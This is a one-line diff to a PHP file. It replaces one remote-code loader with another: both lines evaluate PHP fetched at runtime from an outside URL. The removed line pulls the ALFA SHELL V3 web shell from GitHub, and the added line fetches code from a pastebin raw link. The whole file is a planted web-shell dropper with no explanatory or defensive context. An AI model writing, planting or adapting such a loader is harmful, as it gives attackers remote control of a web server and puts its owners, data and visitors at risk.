@@ -1,1 +1,1 @@
-<?php eval("?>" . file_get_contents("https://raw.githubusercontent.com/raminfp/DeObfuscation_ALFA_SHELL_V3/master/final_alfashell.php")); ?>
+<?php eval("?>" . file_get_contents("https://pastebin.pl/view/raw/d04dcd21")); ?>
